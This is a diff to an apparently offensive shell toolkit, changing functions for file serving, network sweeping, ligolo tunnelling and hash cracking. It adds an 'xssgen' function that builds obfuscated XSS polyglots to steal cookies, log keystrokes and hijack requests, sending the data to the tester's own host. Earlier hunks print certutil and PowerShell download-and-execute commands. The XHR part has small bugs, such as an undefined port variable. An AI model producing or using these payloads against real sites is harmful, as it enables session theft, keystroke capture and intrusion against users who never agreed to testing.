@@ -1047,8 +1047,9 @@ httpserv(){
     echo -e "OPENING HTTP SERVER AT http://$ip:$1\n"
     echo -e "WINDOWS COMMANDS:\n"
     echo -e "- certutil.exe -urlcache -split -f http://$ip:$1/[INPUT] [OUTPUT]'"
-    echo -e "- powershell.exe -c iex(iwr -useb -uri http://$ip:8888/FILE.ps1)"
-    python3 -m http.server 8888 >/dev/null
+    echo -e "- powershell.exe -c iex(iwr -useb -uri http://$ip:$1/FILE.ps1) \n"
+
+    python3 -m http.server $1
 }
 
 httpservUP(){
@@ -1177,79 +1178,81 @@ revgen(){
 
 # Alive Host IP/CIDR Scanning
 alive(){
+    salt=$(openssl rand -hex 4)
     cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
-    echo "\nRemember Local sweeping:"
-    echo "Linux: for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done"
-    echo "Linux ARP: arp -i [interface] -a "
-    echo "Windows:for %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply""
     if [ -f ./$1 ]; then
         echo -e "\n[+] FPING SWEEPING\n"
-        fping -qa < $1
+        fping -q -a < $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
+        cat /tmp/fping_$salt | anew -q alive.txt
+        rm /tmp/fping_$salt
 
-        echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,3389,443 -PP -PU161,40125 -PA21 -g 53 -iL $1 -v
+        echo -e "\n[+] NMAP PING SWEEPING\n"
+        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
+        cnt=$(cat /tmp/nmap_$salt | wc -l)
+        if [[ $cnt == $(cat ./$1 | wc -l) ]]; then
+            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
+        else
+            cat /tmp/nmap_$salt
+            cat /tmp/nmap_$salt | anew -q alive.txt
+        fi
 
         echo -e "\n[+] NBT SWEEPING\n"
         sudo nbtscan -r -f $1
-    
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $1
-        nxc ldap $1
-        nxc winrm $1
-        nxc mssql $1
-        nxc ftp $1
-        nxc wmi $1
-        nxc nfs $1
-        nxc rdp $1
-        nxc ssh $1
 
+        echo -e "\n[+] NXC SERVICE SWEEPING\n"
+        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
+        for protocol in "${protocols[@]}"; do
+            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
+            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
+            rm /tmp/nxc_sweep_$salt
+        done
+
+        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
+        if [[ $portsweep =~ [Yy] ]]; then
+            echo -e "\n[+] TOP 99% TCP SWEEP\n"
+            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 -iL $1
+
+            echo -e "\n[+] TOP-25 UDP SWEEP\n"
+            udpx -tf $1
+        fi
     elif [[ $1 =~ $cidr_regex ]]; then
+        net_sz=$((2**$((32 - $(echo $1 | awk -F"/" '{print $2}')))))
     	echo -e "\n[+] FPING SWEEPING\n"
-	    fping -asgq $1
+	    fping -a -q -g $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
+        cat /tmp/fping_$salt | anew -q alive.txt
+        rm /tmp/fping_$salt
 
         echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,443,3389 -PP -PU161,40125 -PA21 -g 53 $1 -v
+        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
+        cnt=$(cat /tmp/nmap_$salt | wc -l)
+        if [[ $cnt == $net_sz ]]; then
+            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
+        else
+            cat /tmp/nmap_$salt
+            cat /tmp/nmap_$salt | anew -q alive.txt
+            rm /tmp/nmap_$salt
+        fi
 
         echo -e "\n[+] NBT SWEEPING\n"
         sudo nbtscan -r $1
 
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $1
-        nxc ldap $1
-        nxc winrm $1
-        nxc mssql $1
-        nxc ftp $1
-        nxc wmi $1
-        nxc nfs $1
-        nxc rdp $1
-        nxc ssh $1
-    else
-        cidr=$(ip -br a s dev $1 | awk '{print $3}')
-        echo -e "\n[+] SCANNING CIDR \"$cidr\" FOR NETWORK \"$1\"\n"
-        echo -e "\n[+] FPING SWEEPING\n"
-        fping -asgq $cidr
+        echo -e "\n[+] NXC SERVICE SWEEPING\n"
+        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
+        for protocol in "${protocols[@]}"; do
+            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
+            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
+            rm /tmp/nxc_sweep_$salt
+        done
 
-        echo -e "\n[+] NMAP SWEEPING\n"
-        sudo nmap -sn -PE -PS80,443,3389 -PP -PU161,40125 -PA21 -g 53 $cidr -v
+        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
+        if [[ $portsweep =~ [Yy] ]]; then
+            echo -e "\n[+] TOP 99% TCP SWEEP\n"
+            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 $1
 
-        echo -e "\n[+] NBT SWEEPING\n"
-        sudo nbtscan -r $cidr
-
-        echo -e "\n[+] NXC SWEEPING\n"
-        nxc smb $cidr
-        nxc ldap $cidr
-        nxc winrm $cidr
-        nxc mssql $cidr
-        nxc ftp $cidr
-        nxc wmi $cidr
-        nxc nfs $cidr
-        nxc rdp $cidr
-        nxc ssh $cidr
+            echo -e "\n[+] TOP-25 UDP SWEEP\n"
+            udpx -tf $1
+        fi
     fi
-
-    echo -e "\n[+] IPv6 SWEEPING\n"
-    chnic
-    sudo nmap -v -6 -sn ff02::1%$inter
 }
 
 
@@ -1296,7 +1299,10 @@ dnsrec(){
 
 ligstart(){
     mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
-    sudo ligolo-proxy -selfcert -laddr "0.0.0.0:${1:-11601}"
+    chnic
+    echo "./agent -connect $ip:$1 -ignore-cert"
+    sudo cp ~/TOOLS/LIGOLO_AGENTS/ligolo-ng.yaml .
+    sudo ligolo-proxy -selfcert -laddr "$ip:${1:-11601}"
 }
 
 # Default credentials for services / applications
@@ -2136,3 +2142,58 @@ hashcrack() {
     return 1
 }
 
+
+# XSS Exploit generator using obfuscated polyglot
+xssgen() {
+    chnic
+    read -r lport\?"[+] INPUT HTTP PORT: "
+
+    echo -e "\n[+] COOKIE STEALING\n"
+    b64_cookie=$(echo "fetch('http://$ip:$lport/?cookie='+btoa(document.cookie));" | base64 -w0)
+    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_cookie')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_cookie')) AuTOFocus TaBIndeX=1//>\\\\x3e"
+
+    echo -e "\n[+] KEY LOGGING\n"
+    b64_key=$(echo "document.onkeypress=e=>fetch('http://$ip:$lport/?keystroke='+e.key)" | base64 -w0)
+    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_key')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_key')) AuTOFocus TaBIndeX=1//>\\\\x3e"
+
+    echo ""
+    read -r req\?"[+] INPUT REQUEST FILE TO HIJACK VIA XHR (blank to skip): "
+    read -r cross\?"[+] IS THE REQUEST CROSS-DOMAIN? (Y/N): "
+    if [[ -f $req ]]; then
+        method=$(head -n 1 $req | awk '{print $1}')
+        pth=$(head -n 1 $req | awk '{print $2}')
+        host=$(grep ^Host $req | awk '{print $2}')
+        content_type=$(grep ^Content-Type $req | awk '{print $2}')
+        post_data=$(awk 'BEGIN {p=0} /^$/ {p=1; next} p {printf "%s", $0}' $req | tr -d ' ')
+        xhr_url="http://${host}${pth}"
+
+        cross=""
+        csrf=""
+        if [[ $cross =~ [yY] ]]; then
+            cross="x.withCredentials = true;"
+            read -r csrf_url\?"[+] INPUT URL TO STEAL CSRF TOKEN (blank if none): "
+            if [[ ! -z $csrf_url ]]; then
+                read -r csrf_name\?"[+] INPUT NAME OF CSRF TOKEN: "
+                csrf="x.open('GET','$csrf_url',false);x.send(null);regx = /${csrf_name}\" value=\"(.*)\"/g;token = regx.exec(x.responseText)[1];"
+                #TODO: EMBED CSRF TOKEN IN QUERY / POST DATA OF THE XHR HIJACKED REQUEST
+            fi
+        fi
+
+        if [[ $method == "GET" ]]; then
+            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.send(null);")
+        fi
+        if [[ $method == "POST" ]]; then
+            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.setRequestHeader('Content-type','$content_type');x.send('$post_data');")
+        fi
+        echo -e "----------------------------------"
+        echo -e "$b64_key"
+        echo -e "----------------------------------"
+        echo -e "\n[+] XHR FORGERY\n"
+        b64_xhr=$(echo $b64_key | base64 -w0)
+        echo -e "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_xhr')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_xhr')) AuTOFocus TaBIndeX=1//>\\\\x3e"
+
+    fi
+
+    echo -e "\n[+] OPENING HTTP SERVER ON \"http://$ip:$lport\"\n"
+    python3 -m http.server $lport >/dev/null
+}
